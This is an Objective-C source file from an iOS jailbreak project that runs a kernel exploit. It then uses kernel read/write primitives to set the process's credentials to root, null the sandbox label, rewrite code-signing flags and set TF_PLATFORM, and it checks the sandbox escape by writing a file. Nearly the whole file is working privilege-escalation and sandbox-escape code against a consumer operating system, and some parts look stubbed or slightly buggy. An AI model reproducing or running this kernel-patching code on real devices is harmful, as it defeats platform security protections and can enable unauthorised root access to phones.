//
//  jailbreak.m
//  reton
//
//  Created by Luca on 15.02.21.
//

#include "jailbreak.h"
#include <sys/sysctl.h>
#include <sys/snapshot.h>
#include "../Misc/support.h"
#include <UIKit/UIKit.h>
#include <Foundation/Foundation.h>
#include <mach/mach.h>
#include "../Misc/kernel_offsets.h"
#include "../ViewController.h"
#include "amfid.h"
#include "rootfs.h"
#include "utils.h"

#define CPU_SUBTYPE_ARM64E              ((cpu_subtype_t) 2)

cpu_subtype_t get_cpu_subtype() {
    cpu_subtype_t ret = 0;
    cpu_subtype_t *cpu_subtype = NULL;
    size_t *cpu_subtype_size = NULL;
    cpu_subtype = (cpu_subtype_t *)malloc(sizeof(cpu_subtype_t));
    bzero(cpu_subtype, sizeof(cpu_subtype_t));
    cpu_subtype_size = (size_t *)malloc(sizeof(size_t));
    bzero(cpu_subtype_size, sizeof(size_t));
    *cpu_subtype_size = sizeof(cpu_subtype_size);
    if (sysctlbyname("hw.cpusubtype", cpu_subtype, cpu_subtype_size, NULL, 0) != 0) return 0;
    ret = *cpu_subtype;
    return ret;
}


#define IS_PAC (get_cpu_subtype() == CPU_SUBTYPE_ARM64E)


static unsigned off_p_pid = 0x68;               // proc_t::p_pid
static unsigned off_task = 0x10;                // proc_t::task
static unsigned off_p_uid = 0x30;               // proc_t::p_uid
static unsigned off_p_gid = 0x34;               // proc_t::p_uid
static unsigned off_p_ruid = 0x38;              // proc_t::p_uid
static unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
static unsigned off_p_ucred = 0xf0;            // proc_t::p_ucred
static unsigned off_p_csflags = 0x280;          // proc_t::p_csflags

static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
static unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
static unsigned off_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
static unsigned off_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
static unsigned off_ucred_cr_groups = 0x28;     // ucred::cr_groups
static unsigned off_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
static unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label

static unsigned off_t_flags = 0x3a0; // task::t_flags

static unsigned off_sandbox_slot = 0x10;

int jailbreak(void *init) {
    ViewController *apiController = [UIApplication sharedApplication].keyWindow.rootViewController;
    [apiController sendMessageToLog:@"========================= Stage 1 ========================="];
    uint64_t task_pac = cicuta_virosa();
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Task-PAC: 0x%llx", task_pac]];
    printf("\n[==================] Discovery v1 [==================]\n");
    /* Before PAC ---> After PAC */
    uint64_t task = task_pac | 0xffffff8000000000;
    printf("Task:\t\t0x%llx\t--->\t0x%llx\n", task_pac, task);
    
    uint64_t proc_uid_pac = read_64(task + 0x388 + 0x30);
    if (!proc_uid_pac) {
        fprintf(stderr, "failed to get proc_uid\n");
    } else {
        fprintf(stdout, "proc_uid: 0x%llu\n", proc_uid_pac);
        uint64_t proc_uid = proc_uid_pac | 0xffffff8000000000;
        fprintf(stdout, "proc_uid: 0x%llu\n", proc_uid);
        fprintf(stdout, "PAC decrypt: 0x%llx -> 0x%llx\n", proc_uid_pac, proc_uid);
    }
    
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", task_pac, task]];
    uint64_t proc_pac;
    
    if (SYSTEM_VERSION_LESS_THAN(@"14.0")){
        if(IS_PAC){
            proc_pac = read_64(task + 0x388);
        } else {
            proc_pac = read_64(task + 0x380);
        }
    } else {
        if (IS_PAC){
            proc_pac = read_64(task + 0x3a0);
        } else {
            proc_pac = read_64(task + 0x390);
        }
    }
    
    uint64_t proc = proc_pac | 0xffffff8000000000;
    printf("Proc:\t\t0x%llx\t--->\t0x%llx\n", proc_pac, proc);
    
    uint64_t ucred_pac;
    
    if(SYSTEM_VERSION_LESS_THAN(@"14.0")){
        ucred_pac = read_64(proc + 0x100);
    } else {
        ucred_pac = read_64(proc + 0xf0);
    }

    uint64_t ucred = ucred_pac | 0xffffff8000000000;
    printf("UCRED:\t\t0x%llx\t--->\t0x%llx\n", ucred_pac, ucred);
    
    uint32_t buffer[5] = {0, 0, 0, 1, 0};
    uint64_t old_uid = read_64(ucred + off_ucred_cr_uid);
    write_20(ucred + off_ucred_cr_uid, (void*)buffer);
    uint64_t new_uid = read_64(ucred + off_ucred_cr_uid);

    uint32_t uid = getuid();
//    printf("getuid() returns %u\n", uid);

    uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("CR_Label:\t0x%llx\t--->\t0x%llx\n", cr_label_pac, cr_label);
    
    [apiController sendMessageToLog:@"========================= Stage 2 ========================="];
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> getuid() returns %u", uid]];
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> whoami: %s", uid == 0 ? "root" : "mobile"]];
    printf("[==================] Discovery End [==================]\n");

    
    printf("\n[==================] Patches v1 [==================]\n");
    /* Sandbox patches */
    printf("Sandbox-Slot:\t0x%llx", (cr_label + off_sandbox_slot));
    write_20(cr_label + off_sandbox_slot, (void*)buffer);
    printf("\t--->\t0x%llx", read_64(cr_label + off_sandbox_slot));
    if(check_sandbox_escape() == true) printf("\t\t(success)\n");
    else printf("\t\t(failed)\n");
    /* Root User patches */
    printf("Root-User:\t\t0x%llx\t\t--->\t0x%llx", old_uid, new_uid);
    uid == 0 ? printf("\t\t(success)\n") : printf("\t\t(failed)\n");
    /* Setting Group ID to 0 */
    uint32_t old_gid = getgid();
    setgid(0);
    uint32_t gid = getgid();
    printf("GroupID:\t\t%u\t\t\t\t--->\t%u\t\t(%s)\n", old_gid, gid, gid==0 ? "success" : "failed");
    printf("whoami:\t\t\t%s\n", uid == 0 ? "root" : "mobile");
    /* CS Flags */
    uint64_t csflags = read_32(proc + KSTRUCT_OFFSET_PROC_CSFLAGS);
    uint64_t csflags_mod = (csflags|0xA8|0x0000008|0x0000004|0x10000000)&~(0x0000800|0x0000100|0x0000200);
    write_32(proc + KSTRUCT_OFFSET_PROC_CSFLAGS, (void*)csflags_mod);
    printf("CS Flags:\t\t0x%llx\t\t--->\t0x%llx\t\t(%s)\n", csflags, csflags_mod, csflags != csflags_mod ? "success" : "failed");
    /* TF_PLATFORM */
    uint64_t t_flag = read_32(task + KSTRUCT_OFFSET_TASK_TFLAGS);
    printf("TF_PLATFORM:\t\t0x%llx\t--->", t_flag);
    t_flag|=0x4000000;
    write_32(task + KSTRUCT_OFFSET_TASK_TFLAGS, &t_flag);
    write_32(proc + KSTRUCT_OFFSET_PROC_CSFLAGS, csflags|0x24004001u);
    printf("\t0x%llx\n",t_flag);
    printf("[==================] Patches End [==================]\n");
    [apiController sendMessageToLog:@"========================= Stage 3 ========================="];

//    printf("Checking pid of process function...\n");s
//    pid_t backboardd_pid = pid_of_process("/usr/libexec/backboardd");
//    printf("backboardd pid = %d\n", backboardd_pid);
    return 0;
}

bool check_sandbox_escape(void){
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/escaped" contents:nil attributes:nil];
    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/escaped"]){
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/escaped" error:nil];
        return true;
    } else {
        return false;
    }
}

int install_bootstrap(void){
    return 0;
}

int sb_allow_ndefault(void) {
    // Allow SpringBoard to show non-default system apps.
    if(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.springboard.plist", ^(id plist) { plist[@"SBShowNonDefaultSystemApps"] = @YES; }))
        return 1;
    return 0;
}



bool setup_manticore_filesystem(void){
    NSString *jailbreakDirBasePath  = @"/var/mobile/.manticore/";
    NSString *jailbreakPlistPath    = [NSString stringWithFormat:@"%@jailbreak.plist", jailbreakDirBasePath];
    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/.manticore/"] && [[NSFileManager defaultManager]  fileExistsAtPath:jailbreakPlistPath]) {
        return YES;
    }else {
        printf("initial installation of manticore starting...\n");
        
        // Create /var/mobile/.manticore folder for jailbreak/project specific files
        if(![[NSFileManager defaultManager] fileExistsAtPath:jailbreakDirBasePath]) [[NSFileManager defaultManager] createDirectoryAtPath:jailbreakDirBasePath withIntermediateDirectories:YES attributes:nil error:NULL];
        else return NO;
        
        // Create jailbreak.plist
        if(![[NSFileManager defaultManager] fileExistsAtPath:jailbreakPlistPath]) createEmptyPlist(jailbreakPlistPath);
        else return NO;
        return 0;
    }
    return NO;
}
